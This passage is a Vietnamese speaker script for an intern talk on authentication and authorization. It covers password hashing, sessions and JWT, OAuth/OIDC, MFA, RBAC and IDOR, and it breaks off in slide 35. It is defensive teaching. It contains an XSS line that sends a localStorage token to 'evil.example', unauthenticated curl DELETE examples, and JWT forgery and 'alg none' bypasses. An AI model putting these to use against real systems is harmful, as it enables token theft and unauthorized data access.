# Kịch bản nói — Authentication & Authorization

Mỗi slide một mục, theo đúng thứ tự deck (số slide = số ở footer, `12 / 46`). **Nói** là phần bạn
dẫn; các dòng **→ k** là những `data-step` (bấm mũi tên phải rồi nói dòng đó, kèm thứ vừa hiện
ra trên màn hình); **Chốt** là câu để lại trong đầu mọi người trước khi qua slide tiếp theo.
Thời gian ghi ở đầu mỗi slide là ước lượng, `⏱ tới m:ss` là đồng hồ tích luỹ khi rời slide đó.

Không có gì ở đây hiện trên màn hình. Số liệu thì lấy slide làm chuẩn — sửa số trên slide thì
nhớ sửa luôn ở đây. Người nghe là intern: biết HTTP, REST, viết được API CRUD, nhưng chưa từng tự
làm login. Nói chậm, hỏi khán phòng nhiều, thuật ngữ kỹ thuật giữ nguyên tiếng Anh.

## Trước khi bắt đầu

- Mở deck qua HTTP (`cd presentation && python3 -m http.server 8000`, mở `http://localhost:8000`),
  bấm `F` để fullscreen.
- Phím: `→` / `←` để step, `O` xem overview, `T` đổi theme sáng. Ở slide 44: `L` / `S` / `A`.
- Terminal thứ hai, trước khi lên nói: `cd demo && pnpm start` (server chạy nền trên `:4000`).
  Lần đầu trên máy mới thì `pnpm install` trước.
- Nhảy tới slide 44, kiểm tra chip góc trên hiện `● live · :4000` (xanh), không phải `○ recording`.
  Rồi quay về slide 1 bằng `Home`.
- Chuẩn bị sẵn Kahoot (câu hỏi trong `presentation/notes/kahoot-questions.md`, 12 câu), mở game ở
  một tab khác để lấy PIN cho slide 46.

## Thời lượng

| Phần | Slide | Dự kiến | Đồng hồ |
|---|---|---|---|
| Cover + outline + 00 Giới thiệu | 1–7 | 4 phút | 0:00 → 4:00 |
| 01 Mật khẩu | 8–14 | 7 phút | 4:00 → 11:00 |
| 02 Session & JWT | 15–24 | 10 phút | 11:00 → 21:00 |
| 03 Login with Google | 25–31 | 8 phút | 21:00 → 29:00 |
| 04 Phân quyền & 4 lỗi | 32–39 | 9 phút | 29:00 → 38:00 |
| 05 Demo | 40–45 | 7 phút | 38:00 → 45:00 |
| Cảm ơn: Q&A + Kahoot | 46 | ~10 phút | 45:00 → 55:00 |

**Nếu bị trễ:** nói ngắn lại các slide "Do / Don't" (14, 24, 31) — chỉ đọc tiêu đề và một dòng
mỗi cột, vì slide 39 gom lại hết. Đừng bao giờ bỏ slide 44 — demo live mới là thứ mọi người nhớ.

---

# Phần 0 — Giới thiệu · ⏱ 0:00 → 4:00

### 1 · Cover — Authentication & Authorization
_~30 s · ⏱ tới 0:30_

**Nói:** Chào mọi người, mình là Trúc. Hôm nay mình nói về authentication và authorization — hai
chữ nghe giống nhau, nhưng là hai câu hỏi khác nhau. Mỗi request vào API của mình, trước khi đụng
tới database, phải trả lời được: ai gửi request này, và người đó có được phép làm việc này không.
**Chỉ lên hình:** một viewer gọi `DELETE /users/42`. Bước AuthN qua — server biết đó là ai. Bước
AuthZ thì không — viewer không được xoá user, nên trả `403 Forbidden`. Cuối buổi, cả phòng sẽ
giải thích được vì sao là `403` chứ không phải `401`.

### 2 · Outline
_~20 s · ⏱ tới 0:50_

**Nói:** Sáu phần. Giới thiệu ngắn, rồi mật khẩu, rồi làm sao server nhớ mình đã login — session
cookie với JWT. Sau đó là nút "Login with Google". Phần bốn là phân quyền và bốn lỗi mà intern hay
dính nhất. Cuối cùng là demo: mình sẽ thử giả một cái JWT ngay trên sân khấu.
**Chốt:** Có gì thắc mắc thì hỏi luôn nha, đừng để dồn tới cuối.

### 3 · Divider 00 — Introduction
_~10 s · ⏱ tới 1:00_

**Nói:** Bắt đầu bằng hai câu hỏi mà request nào cũng phải trả lời, và hai status code đi kèm.

### 4 · With no checks, anyone who knows the URL can delete user 42
_~50 s · ⏱ tới 1:50_

**Nói:** Đây là kiểu endpoint mà tuần đầu đi làm ai cũng viết: `app.delete("/users/:id")`, xoá rồi
trả `204`. Hỏi cả phòng: code này có bug không? (Chờ vài giây.) Nó chạy đúng y như những gì nó viết
— cho bất kỳ ai gọi nó.
**→ 1:** Một người lạ, không login, không token, gõ đúng một lệnh `curl -X DELETE`. Server trả
`204 No Content` — user 42 bay màu. Bug ở đây là server chưa bao giờ hỏi ai đang gửi request, và
người đó có được làm vậy không.
**→ 2:** Hai câu hỏi. Một: bạn là ai — admin đã login, một khách hàng, hay không ai cả? Hai: bạn có
được làm việc này không — xoá *đúng user này*, ngay bây giờ?
**Chốt:** Request nào cũng phải trả lời đủ hai câu, trước khi chạm tới database.

### 5 · Authentication finds out who you are. Authorization decides what you may do.
_~50 s · ⏱ tới 2:40_

**Nói:** Hai câu hỏi đó có tên. Bên trái là **AuthN** — authentication — *bạn là ai?* Mình chứng
minh danh tính bằng password, bằng mã 6 số trên điện thoại, hay bằng "Login with Google". Kết quả:
server biết `user_id = 42`, hoặc không biết gì. Bên phải là **AuthZ** — authorization — *bạn được
làm gì?* Server đã biết bạn là ai, giờ kiểm tra luật: `viewer` được xem danh sách user nhưng không
được xoá. Kết quả: cho, hoặc không cho.
Ví von khách sạn cho dễ nhớ: lễ tân kiểm CCCD trước khi đưa thẻ phòng — đó là AuthN. Thẻ phòng chỉ
mở phòng 702, không mở 703, không mở phòng nhân viên — đó là AuthZ.
**→ 1:** Và thứ tự luôn là AuthN trước. Chưa biết người ta là ai thì không thể quyết định người ta
được làm gì.

### 6 · 401 means "log in first". 403 means "logging in again will not help".
_~50 s · ⏱ tới 3:30_

**Nói:** Hai câu hỏi đó ứng với hai status code mà các bạn sẽ gặp trong network tab suốt. Bên trái:
gọi `/admin/users` mà không có cookie, không có header `Authorization` → `401 Unauthorized`. AuthN
fail: server không biết bạn là ai — token thiếu, hết hạn, hoặc giả. Cái tên `Unauthorized` gây hiểu
lầm, thật ra nó nghĩa là *unauthenticated*. Frontend nhận `401` thì đưa user về trang login.
Bên phải: token hợp lệ, role viewer → `403 Forbidden`. AuthZ fail: server biết bạn là user 42, là
viewer, và viewer không được làm việc này. Login lại thì vẫn là user đó, vẫn câu trả lời đó.
Frontend hiện "You don't have access", đừng redirect.
**→ 1:** Bug hay gặp: trả `401` cho một viewer đã login. Frontend đá họ về login, họ login lại, gọi
lại, lại `401` — vòng lặp vô tận.
**Chốt:** `401` = chưa biết bạn là ai. `403` = biết rồi, vẫn không cho.

### 7 · Every request passes two checkpoints before it reaches the database
_~30 s · ⏱ tới 4:00_

**Nói:** Ghép lại thành một request. Browser gửi kèm một "vé" — `Cookie: sid=…` hoặc
`Authorization: Bearer eyJ…`. Trạm đầu là auth middleware: bạn là ai? Không có vé hợp lệ → `401`.
Trạm hai là route handler: bạn có được làm không? Biết bạn rồi mà không được → `403`. Qua cả hai
mới tới database.
**→ 1:** Đây cũng là bản đồ của cả buổi: section 1 tới 3 là AuthN — mật khẩu, server nhớ bạn bằng
cách nào, rồi "Login with Google". Section 4 là AuthZ và bốn lỗi intern hay dính nhất.

---

# Phần 1 — Mật khẩu · ⏱ 4:00 → 11:00

### 8 · Divider 01 — Passwords
_~10 s · ⏱ tới 4:10_

**Nói:** Bắt đầu từ trạm đầu tiên. Mục tiêu của phần này: lưu password sao cho lỡ database bị lộ thì
cũng không lộ gì dùng được.

### 9 · A leaked database must not leak passwords
_~60 s · ⏱ tới 5:10_

**Nói:** Phiên bản đầu tiên, rất tự nhiên: bảng `users` có cột `email` và `password`, lưu nguyên văn.
Hỏi phòng: có ai từng thấy, hoặc từng viết, bảng như vầy chưa? (Cười nhẹ, không cần ai giơ tay.)
Vấn đề: ai nhìn thấy bảng này là thấy mọi password. Một file backup quên trên S3, một lỗi SQL
injection, một đồng nghiệp có quyền read — vậy là đủ.
**→ 1:** Còn tệ hơn: người ta xài lại password. `Dung@1998` của chị Dung nhiều khả năng cũng mở được
Gmail và app ngân hàng của chị ấy. Mình làm lộ không chỉ app của mình.
**→ 2:** Luật: không bao giờ lưu password gốc. Kể cả "chỉ là môi trường dev" — database dev hay bị
copy về laptop, bị share trong Slack.

### 10 · Encryption can be undone with a key. A hash cannot be undone at all.
_~60 s · ⏱ tới 6:10_

**Nói:** Vậy mã hoá nó lại là xong? Không. Hai thứ hay bị nhầm. Encryption là hai chiều: khoá lại,
có key là mở ra được — `decrypt(…, key)` ra lại `"hunter2"`. Mà key phải nằm trên chính server đọc
database, nên attacker lấy được cái này thường lấy được luôn cái kia. Encryption dùng cho data mình
cần đọc lại: API key của đối tác, số tài khoản ngân hàng.
Hashing là một chiều: cùng input thì ra cùng một "dấu vân tay", và không có hàm `unhash()`. Lúc
login, mình hash cái user vừa gõ rồi so với hash đã lưu — trùng hash là trùng password. Mình không
bao giờ cần đọc lại password, chỉ cần kiểm tra.
**→ 1:** Nên password thì hash, không encrypt. Nhưng như slide sau sẽ thấy: không phải hash bằng
`sha256`.

### 11 · With SHA-256, the same password gives the same hash, and attackers already have a lookup table
_~80 s · ⏱ tới 7:30_

**Nói:** Để ý thanh tiến trình ở trên — mình đi từ plaintext, giờ tới SHA-256, rồi salt, rồi bcrypt.
Bảng này lưu `sha256(password)`. Nhìn An và Bình: hai hash giống y hệt nhau. Vậy là hai người cùng
password. Crack một người là có luôn người kia.
**→ 1:** Còn tệ hơn: có sẵn rainbow table — bảng tra `hash → password`, hash sẵn hàng tỷ password
phổ biến, share đầy trên mạng. `8d969eef…` tra ra `123456` ngay. Không phải crack, mà là *tra*.
Không giây nào.
**→ 2:** Thêm nữa, SHA-256 và MD5 được thiết kế để *nhanh*. Một con GPU chơi game thử khoảng 10 tỷ
hash mỗi giây. Mọi password 8 chữ thường: 26⁸, khoảng 209 tỷ lần đoán — tầm 21 giây.
**Chốt:** Hash nhanh là tin tốt cho checksum file, tin xấu cho password.

### 12 · A random salt per user makes the same password hash differently every time
_~70 s · ⏱ tới 8:40_

**Nói:** Bước tiếp theo trên thanh: salt. Salt là một chuỗi random tạo riêng cho từng user lúc
đăng ký, lưu ngay cạnh hash. Nó không phải bí mật. Giờ mình hash `salt + password`. An và Bình vẫn
cùng gõ `123456`, nhưng hai hash khác hẳn nhau — nhìn bảng không đoán ra được gì.
**→ 1:** Rainbow table vô dụng, vì không ai hash sẵn chuỗi `f3a9c1e07b2d123456`. Và crack được An
cũng không nói gì về Bình — attacker phải làm lại từ đầu cho từng user.
**→ 2:** Nhưng vẫn còn một vấn đề: SHA-256 vẫn nhanh. Nhắm vào một user thôi thì GPU vẫn đoán 10 tỷ
lần mỗi giây. Hỏi phòng: vậy làm sao cho nó chậm lại? (Dẫn qua slide sau.)

### 13 · bcrypt is slow on purpose, and keeps its own salt inside the hash string
_~80 s · ⏱ tới 10:00_

**Nói:** Bước cuối: bcrypt. Đây là một chuỗi bcrypt thật, các bạn sẽ thấy nó trong database. Nhìn
qua thì như rác, nhưng nó có cấu trúc.
**→ 1:** Tách ra bốn phần. `$2b$` là thuật toán — bcrypt. `12$` là cost: 2¹², tức 4.096 vòng. Tiếp
theo là salt, 22 ký tự, random cho user này. Phần còn lại là hash 31 ký tự — salt cộng password, chạy
qua 4.096 vòng.
Nhìn code bên dưới: cùng `123456`, hai user, hai chuỗi khác nhau. Và chỉ cần **một cột** — không cần
cột salt riêng, vì `bcrypt.compare` tự đọc cost và salt ra từ chuỗi.
**→ 2:** Cost 12 là khoảng 250 ms mỗi lần hash. User login một lần, không ai thấy chậm. Nhưng với
attacker: 209 tỷ password 8 chữ đó, SHA-256 mất 21 giây trên một GPU; bcrypt mất khoảng 1.650 năm
thời gian CPU. Tăng cost lên 1 là gấp đôi thời gian. Argon2id là lựa chọn mới hơn, cùng ý tưởng.
**Chốt:** Chậm có chủ đích — chậm với attacker, không đáng kể với user.

### 14 · Let a well-known library do the hashing. Your job is to not leak anything around it.
_~60 s · ⏱ tới 11:00_

**Nói:** Mang về được gì? Mỗi hàng: bên trái đừng làm, bên phải nên làm. Đọc từ trên xuống.
- **Hash:** đừng `md5` hay `sha256` — nhanh, crack trong vài giây. Dùng `bcrypt.hash(pw, 12)`: chậm có chủ đích, có salt sẵn.
- **Compare:** đừng tự hash rồi so `==` — sót salt, lộ timing. Dùng `bcrypt.compare`, thư viện làm đúng.
- **Error:** đừng báo "No account with this email" — attacker biết email nào tồn tại. Một câu cho mọi trường hợp: "Email or password is wrong".
- **Leaks:** đừng log `req.body` hay `res.json(user)` — log luôn password, gửi luôn hash ra ngoài. Chỉ log `user.id`, chỉ trả `{ id, email }`.
- **Column:** đừng đặt tên cột `password` — nhìn như password thật. Đặt `password_hash`, nói đúng nó chứa gì.
**Chốt:** Thuật toán thì thư viện lo. Việc của mình là đừng làm rò rỉ gì xung quanh nó.

---

# Phần 2 — Giữ trạng thái đăng nhập: Session & JWT · ⏱ 11:00 → 21:00

### 15 · Divider 02 — Staying logged in
_~10 s · ⏱ tới 11:10_

**Nói:** Password đúng rồi, login xong rồi. Nhưng HTTP quên mình ngay sau mỗi request. Session
cookie và JWT là hai cách mang theo một cái "vé".

### 16 · You log in on request 1. On request 2 the server has no idea who you are.
_~60 s · ⏱ tới 12:10_

**Nói:** Request 1: `POST /login` → `200 "Welcome, An"`. Request 2: `GET /orders` → `401 "Who are
you?"`. HTTP là **stateless**: mỗi request đến một mình, server không nhớ request trước đó.
Hỏi phòng: vậy gửi kèm password với mỗi request được không? (Chờ.) Không nên: browser phải giữ
password, mà mỗi lần kiểm tra bằng bcrypt mất ~250 ms — gọi API nào cũng chậm.
**→ 1:** Nên sau khi login, server phát cho một cái **vé**. Browser gắn vé đó vào mọi request:
`Cookie: sid=…` hoặc `Authorization: Bearer eyJ…`. Có vé → `200`, thấy được đơn hàng.
**→ 2:** Có hai loại vé. Session cookie: *server* nhớ bạn. JWT: *cái vé* nhớ bạn. Hai slide tới là
hai loại này.

### 17 · The cookie is only a random ID. Who you are lives in a table on the server.
_~70 s · ⏱ tới 13:20_

**Nói:** Loại thứ nhất. Login xong, server trả header `Set-Cookie: sid=9f8c…` kèm mấy flag. Từ đó
browser tự gửi `Cookie: sid=…` theo mọi request, mình không phải code gì. Ba flag quan trọng:
`HttpOnly` — JavaScript không đọc được; `Secure` — chỉ gửi qua HTTPS; `SameSite=Lax` — không gửi kèm
form post từ site khác.
Cái cookie chỉ là một ID random. "Bạn là ai" nằm ở bảng sessions trên server, Redis hoặc DB: mỗi
request đọc `sid`, tra dòng, ra `user_id = 42`. Mỗi request một lần tra.
**→ 1:** Logout thì sao? Xoá dòng đó đi. Request tiếp theo mang `sid` đó nhận `401` ngay lập tức.
**→ 2:** Về thử nha: mở DevTools → Application → Cookies. Các bạn sẽ thấy `sid`, không bao giờ thấy
password.

### 18 · A JWT carries who you are inside the token, plus a signature only the server can make.
_~70 s · ⏱ tới 14:30_

**Nói:** Loại thứ hai — chuỗi `eyJ…` các bạn sẽ thấy trong header `Authorization`. Slide này tách nó
ra ngay trong browser. Ba phần, cách nhau bằng dấu chấm, mỗi phần là base64url.
Màu thứ nhất là **header**: nói token được ký thế nào — `HS256`, tức HMAC-SHA256 với một secret chỉ
server có. Màu thứ hai là **payload** — các claim: `sub` là ai, `role` là được làm gì, `iat` là phát
lúc nào, `exp` là hết hạn sau 15 phút. Decode ngay đây bằng `atob`, y như jwt.io làm. Màu thứ ba là
**signature**: HMAC-SHA256 của header chấm payload, với secret. Chỉ server biết secret.
Điểm khác với session: request sau, server chỉ cần **kiểm tra signature**, không cần tra database.
**Tuỳ chọn:** có ô "paste any JWT" — nếu ai có token thật trong máy, dán vào xem. Bấm `Esc` để trả
bàn phím cho deck, `↻ sample` để quay lại token mẫu.

### 19 · Anyone who holds the token can read the payload. No secret needed.
_~50 s · ⏱ tới 15:20_

**Nói:** Câu hỏi cho phòng: payload đó có bị mã hoá không? (Chờ.) Không. Mở console bất kỳ,
`atob` phần giữa là ra JSON. Hoặc dán vào jwt.io. **Base64** chỉ viết lại byte bằng 64 ký tự an toàn
để nhét vừa header hay URL. Ai cũng đảo lại được, giống đổi bảng chữ cái thôi.
**→ 1:** Nên **đừng bao giờ** để trong payload: password hay hash, số thẻ, CCCD, API key — bất cứ thứ
gì mình không dám in lên hoá đơn.
**→ 2:** Để được: user id, role, thời hạn — những thứ user được phép biết về chính mình. Và nhớ:
signature ở slide sau chống *sửa* token, nó không làm gì để chống *đọc*.

### 20 · Change "viewer" to "admin" and the signature stops matching. The server answers 401.
_~80 s · ⏱ tới 16:40_

**Nói:** Vậy đọc được thì sửa được không? Attacker decode token của chính mình:
`"role": "viewer"`. Sửa payload mất năm giây, vì base64 không phải ổ khoá.
**→ 1:** Đổi một chữ thành `"admin"`, encode lại, giữ nguyên signature cũ. Nhìn token: phần payload
mới, phần signature cũ. Nhưng signature được tạo từ payload **cũ** với secret của server. Không có
secret thì không ai tạo được signature khớp với payload mới.
**→ 2:** Mỗi request, server tính lại: `HMAC-SHA256(header.payload, secret)` ra `JQxpmG8l…`. Trong
token là `XxLJzh34…`. Không khớp → `401 Unauthorized`. Signature chống *sửa*. Chỉ vậy thôi.
**→ 3:** Bẫy này đã từng xảy ra thật: có server chấp nhận `"alg": "none"` với signature rỗng, hoặc gọi
`decode()` trong khi ý là `verify()`. Cả hai đều bỏ qua bước kiểm tra. Luôn verify bằng thư viện, và
tự chỉ định thuật toán: `algorithms: ["HS256"]`.
**Chốt:** Mình sẽ làm đúng trò này live ở phần demo.

### 21 · Sessions are easy to cancel. JWTs are easy to check without a database. Pick the one you need.
_~70 s · ⏱ tới 17:50_

**Nói:** Đặt cạnh nhau. "Bạn là ai" nằm ở đâu: session — bảng trên server; JWT — trong token, ở phía
client. Mỗi request: session tra một lần theo `sid`; JWT chỉ kiểm signature, không tra. Logout hay ban
user: session — xoá dòng, có hiệu lực ngay; JWT — token vẫn chạy tới `exp`. Kích thước: session cookie
khoảng 30 ký tự, JWT 200 tới 1000. Hợp với gì: session cho web app một backend cần logout ngay; JWT cho
nhiều service tự kiểm token, hoặc mobile app.
**→ 1:** Nhược điểm lớn của JWT: không thu hồi được trước `exp`. Token bị đánh cắp vẫn chạy. Muốn có
danh sách "revoked" thì lại phải tra mỗi request — mất luôn cái lợi.
**→ 2:** Cách thường làm: giữ `exp` thật ngắn. Slide sau.

### 22 · A short access token limits the damage. A long refresh token saves the user from logging in again.
_~70 s · ⏱ tới 19:00_

**Nói:** Hai token. **Access token** là JWT, sống 15 phút, gửi theo mọi API call trong
`Authorization: Bearer`. Bị lộ thì chỉ dùng được tối đa 15 phút. **Refresh token** sống 7 tới 30 ngày,
chỉ gửi tới `POST /auth/refresh` để xin access token mới. Nó được lưu trên server, nên xoá được.
Nhìn timeline: cứ mỗi 15 phút, refresh token đổi lấy một access token mới — user không phải login lại.
**→ 1:** Logout lúc 1h10: refresh token bị xoá trên server. Access token đã phát vẫn chạy tới 1h15, rồi
`401` — không còn ai cấp token mới nữa.
**Chốt:** Logout với JWT = xoá refresh token. Thiệt hại tối đa là phần còn lại của 15 phút.

### 23 · Any script on the page can read localStorage. No script can read an HttpOnly cookie.
_~60 s · ⏱ tới 20:00_

**Nói:** Token để ở đâu trên browser? Hỏi phòng: ai đang để token trong `localStorage`? (Thường sẽ có
người giơ tay — không sao, ai cũng từng.) Bên trái: `localStorage.setItem("token", jwt)`. Mọi script
trên trang đọc được nó: script của mình, của một npm package, hoặc một script attacker nhét vào — XSS.
Chỉ cần một dòng `fetch("https://evil.example?t=" + localStorage.token)`.
Bên phải: cookie `HttpOnly`. Browser vẫn tự gửi nó theo mọi request tới API, nhưng `document.cookie`
trả về rỗng — JavaScript, kể cả script của attacker, không bao giờ thấy giá trị.
**→ 1:** Mặc định: để token trong cookie `HttpOnly; Secure; SameSite=Lax`.
**→ 2:** Đánh đổi: browser tự gửi cookie, nên mở cửa cho CSRF. `SameSite` đóng được phần lớn. Hai kiểu
tấn công này — XSS và CSRF — mình gặp lại ở 4.5 và 4.6.

### 24 · Use a library, keep tokens short-lived, and keep them out of JavaScript's reach.
_~60 s · ⏱ tới 21:00_

**Nói:** Mang về. Mỗi hàng: trái đừng làm, phải nên làm.
- **Verify:** đừng `jwt.decode` rồi tin luôn — bỏ qua signature. Dùng `jwt.verify` và ghim `algorithms: ["HS256"]`.
- **Payload:** đừng nhét password, số thẻ vào payload — ai cũng đọc được. Chỉ để `sub`, `role`, `exp`.
- **Storage:** đừng để token trong `localStorage` — script nào cũng đọc được. Dùng cookie `HttpOnly; Secure; SameSite=Lax`, JavaScript không đọc được.
- **Lifetime:** đừng cho `exp` 30 ngày — bị lộ là xài được cả tháng. Access token 15 phút, refresh token nằm trên server, logout thì xoá refresh.
- **Secret:** đừng hardcode secret rồi commit vào git — ai có nó cũng ký được token. Đọc từ `process.env.JWT_SECRET`, dài, random, mỗi env một cái.

---

# Phần 3 — "Login with Google" · ⏱ 21:00 → 29:00

### 25 · Divider 03 — Login with Google
_~10 s · ⏱ tới 21:10_

**Nói:** Cái nút ai cũng bấm hằng ngày. Làm sao để một app khác làm việc thay user mà không bao giờ
thấy password? OAuth 2.0, OpenID Connect, và MFA.

### 26 · An app that has your Google password has all of Google, until you change it
_~60 s · ⏱ tới 22:10_

**Nói:** Bài toán: CalApp muốn đọc Google Calendar để hiện lịch tuần của bạn. Cách tệ nhất: hiện một
form hỏi email và password Google. Hỏi phòng: bạn có nhập không? (Chờ.) Có password là CalApp đọc
được Gmail, xoá file Drive, đổi số điện thoại khôi phục. Không chỉ cái lịch.
**→ 1:** Không có nút undo: không lấy lại quyền từ riêng CalApp được. Đổi password là đăng xuất mọi
app, mọi thiết bị của mình.
**→ 2:** Thêm một chỗ rò rỉ: giờ CalApp lưu password Google của bạn. Database CalApp bị lộ là Gmail
của bạn bị lộ.
**→ 3:** Thứ mình muốn: chỉ đọc lịch · thu hồi được theo từng app · password **không bao giờ rời
khỏi Google**.

### 27 · OAuth 2.0 hands the app a key that opens one thing, instead of your password
_~60 s · ⏱ tới 23:10_

**Nói:** OAuth 2.0 có bốn vai. **Resource owner** — bạn, chủ cái lịch, người duy nhất được nói "đồng
ý". **Client** — CalApp, muốn làm việc thay bạn; nó đăng ký với Google nên có `client_id` và
`client_secret`. **Authorization server** — `accounts.google.com`: kiểm tra password, hỏi "cho CalApp
không?", phát token. **Resource server** — Calendar API: giữ data, chỉ trả lời token hợp lệ với đúng
`scope`.
**→ 1:** Ví von chìa khoá xe. Password là chìa chính: mở cửa, mở cốp, mở hộc đồ — đưa cho nhân viên
giữ xe là đưa luôn cả chiếc xe. `access_token` với `scope=calendar.readonly` là chìa valet: chỉ nổ
máy, không làm gì khác. Nó hết hạn, và bạn thu hồi được bất cứ lúc nào trong tài khoản Google.

### 28 · The password goes only to Google. The app gets a one-time code and trades it for a token.
_~120 s · ⏱ tới 25:10_

**Nói:** Đây là Authorization Code flow, có animation. Thanh chip ở trên cho biết mình đang ở bước
nào; nút ↻ cạnh dòng chữ để chạy lại bước hiện tại. Đọc dòng chữ bên dưới hình theo từng bước.
Bước 1 chạy ngay khi vào slide: bạn bấm "Connect Google Calendar". CalApp trả về một **redirect**:
ai đang xin, quay về đâu, xin quyền gì, và một `state` random. Browser đi theo sang Google; CalApp
nhớ `state=x7Kq9` để lát kiểm.
**→ 1 (log in + Allow):** Bạn gõ password **trên trang của Google**. Nó đi từ browser tới Google,
không đi đâu khác. Google hỏi consent cho đúng `calendar.readonly`, bạn bấm Allow. Để ý chữ dưới
CalApp: "never saw the password".
**→ 2 (back with a code):** Google đưa browser về `calapp.vn/callback?code=…&state=x7Kq9`. CalApp
kiểm `state` đúng cái nó đã gửi. Cái `code` chưa phải token: dùng được **một lần**, trong vài phút, và
chỉ đi kèm secret.
**→ 3 (code → token):** Đây là đoạn server với server — browser không bao giờ thấy. Backend của
CalApp gọi thẳng Google: `code` + `client_secret`. Google kiểm cả hai, trả `access_token`. Secret
không bao giờ rời server.
**→ 4 (call the API):** CalApp gọi Calendar API với `Authorization: Bearer …`. API kiểm token và
scope, trả 12 sự kiện, CalApp vẽ lịch tuần. Không thấy password, và bạn thu hồi được riêng app này.
**Chỉ xuống dòng ghi chú:** SPA hay mobile app thì không giấu được `client_secret`, nên thêm **PKCE**
— một bằng chứng random dùng một lần thay cho secret. Chỉ cần biết tên vậy thôi.

### 29 · An access token says what the app may do, not who you are. OIDC adds an id_token for that.
_~90 s · ⏱ tới 26:40_

**Nói:** Một chỗ hay nhầm: OAuth là *authorization*, không phải login. `access_token` với
`scope=calendar.readonly` nghĩa là "ai cầm cái này thì đọc được một cái lịch". Nó không nói của ai, và
app của mình không được mở nó ra đọc.
**OpenID Connect** — OIDC — thêm `scope=openid email profile`, và Google trả thêm một **`id_token`**:
một JWT về user, làm riêng cho app của mình. Đó mới thật sự là "Login with Google": OAuth cộng thêm
một token. Nhìn bên phải: chính là JWT ở section 2 — `iss` là Google, `sub`, `email`, `name`, `aud`
là `client_id` của CalApp, `exp`.
**→ 1:** Verify bốn thứ: signature bằng public key của Google, `iss` là Google, `aud` là `client_id`
**của mình**, `exp` chưa qua. Thư viện làm hết cả bốn. Lưu user theo `sub`, không theo `email` —
email Google đổi được, `sub` thì không bao giờ.
**→ 2:** Và đừng login user bằng `access_token`: một token mà app *khác* xin được cho user đó cũng sẽ
chạy được trên app của mình.

### 30 · A stolen password is not enough when login also needs a second factor of a different kind
_~80 s · ⏱ tới 28:00_

**Nói:** Còn nếu password bị lộ thì sao? MFA. Ba loại yếu tố: thứ bạn *biết* — password, PIN; thứ bạn
*có* — điện thoại, security key; thứ bạn *là* — vân tay, khuôn mặt. Hai yếu tố phải **khác loại**.
Hỏi phòng: password cộng câu hỏi bảo mật có phải hai yếu tố không? (Chờ.) Không — cả hai đều là thứ
bạn biết.
**→ 1:** Ba kiểu yếu tố thứ hai hay gặp. TOTP — Google Authenticator: điện thoại và server chung một
secret, cả hai biến đồng hồ thành mã 6 số, đổi mỗi 30 giây, chạy offline. Điểm yếu: trang login giả
có thể hỏi mã và dùng ngay trong 30 giây. Mặc định tốt. SMS OTP: server nhắn mã qua số điện thoại.
Điểm yếu: SIM swap — attacker thuyết phục nhà mạng chuyển số của bạn sang SIM của họ. Yếu nhất.
Passkey — vân tay, khuôn mặt: thiết bị ký một challenge bằng private key, và chỉ trả lời đúng domain
thật. Không có gì để gõ, nên trang giả không có gì để lấy. Mạnh nhất.
**→ 2:** MFA là chuyện của AuthN, xảy ra lúc login. Với "Login with Google" thì **Google** hỏi yếu tố
thứ hai. App của mình không bao giờ thấy, chỉ nhận `id_token`.

### 31 · Rent login from a provider, and keep the secret on the server
_~60 s · ⏱ tới 29:00_

**Nói:** Mang về. Mỗi hàng: trái đừng làm, phải nên làm.
- **Provider:** đừng hỏi password Google của user, đừng tự build OAuth server. Redirect sang Google và dùng SDK của nó — hoặc Auth0, Keycloak, Cognito.
- **Secret:** đừng để `client_secret` trong React, app mobile hay git — ai cũng đọc được bundle. Chỉ ở backend, đọc từ env.
- **Scope:** đừng xin `scope=calendar` — toàn quyền đọc ghi. Xin `calendar.readonly`, nhỏ nhất mà đủ dùng.
- **Callback:** đừng nhận bất kỳ `?code=` nào — attacker có thể làm mình login vào tài khoản của họ. Kiểm `state` khớp; không khớp thì không login.
- **Identity:** đừng login bằng `access_token` — token của app khác cũng xài được trên app mình. Verify `id_token`, lưu user theo `sub` vì `sub` không bao giờ đổi.

---

# Phần 4 — Phân quyền & 4 lỗi hay gặp · ⏱ 29:00 → 38:00

### 32 · Divider 04 — Permissions & attacks
_~10 s · ⏱ tới 29:10_

**Nói:** Xong trạm một. Giờ là trạm hai: ai được làm gì, và bốn lỗi giúp attacker bỏ qua bước kiểm
tra đó.

### 33 · Your code should ask "may this user delete orders?", never "is this user an admin?"
_~70 s · ⏱ tới 30:20_

**Nói:** **RBAC** — Role-Based Access Control. User có một role, role chỉ là một danh sách permission
có tên. Bảng: `viewer` chỉ `orders:read`; `editor` thêm `orders:write`; `admin` có cả `orders:delete`.
Bảng này nằm ở một chỗ — config hoặc một bảng DB — không rải khắp các handler.
Code bên phải: `if (user.role === "admin")`. Thêm role mới là phải sửa mọi cái `if`.
**→ 1:** Thay vào đó, kiểm *permission*: `if (can(user, "orders:delete"))`. Hàm `can()` tra role trong
bảng.
**→ 2:** Vì sao? Mai có thêm role `support` được phép xoá. Mình sửa một dòng trong bảng, chứ không phải
40 câu `if`.

### 34 · The frontend hid the Delete button. Anyone with curl can still call the API.
_~50 s · ⏱ tới 31:10_

**Nói:** Câu này dành riêng cho các bạn frontend. Viewer nhìn thấy dòng đơn hàng với nút View, còn nút
Delete thì bị ẩn bằng `{user.role === "admin" && <DeleteButton />}`. Vậy là an toàn chưa? Browser là máy
của user: họ mở DevTools, sửa trang, hoặc bỏ qua trang và dùng curl, Postman.
**→ 1:** Attacker gõ `curl -X DELETE …/orders/1024` với cookie session của chính viewer đó → `204` — xoá
mất. Bug: API tin UI sẽ kiểm. Không có gì trên server hỏi "user này có được xoá không?"
**→ 2:** Fix nằm ở server: `requirePermission("orders:delete")` trước handler → `403 Forbidden`. Ẩn nút
là để UI đẹp. Mọi kiểm tra quyền phải chạy cả ở backend, trên mọi request.

### 35 · "Logged in" is not "allowed": check that the row belongs to this user
_~80 s · ⏱ tới 32:30_

**Nói:** An mở đơn của mình: `GET /orders/1024` → `200`, owner `"an"`. Endpoint này kiểm "có session
hợp lệ không" rồi dừng. Hỏi phòng: An làm gì tiếp theo? (Chờ — thường có người đoán ra.)
**→ 1:** An đổi một chữ số: `/orders/1025` → `200`, owner `"binh"`, kèm luôn địa chỉ. Đó là **IDOR** —
Insecure Direct Object Reference: cái ID trên URL là ổ khoá duy nhất. Broken access control đứng số
một trong OWASP Top 10, danh sách rủi ro web.
**→ 2:** Fix: đưa chủ sở hữu vào chính câu query — `WHERE id = ? AND user_id = ?`, với `req.user.id`.
Không có dòng nào → `404`, giống y như đơn không tồn tại. Lấy user từ session, không bao giờ từ request
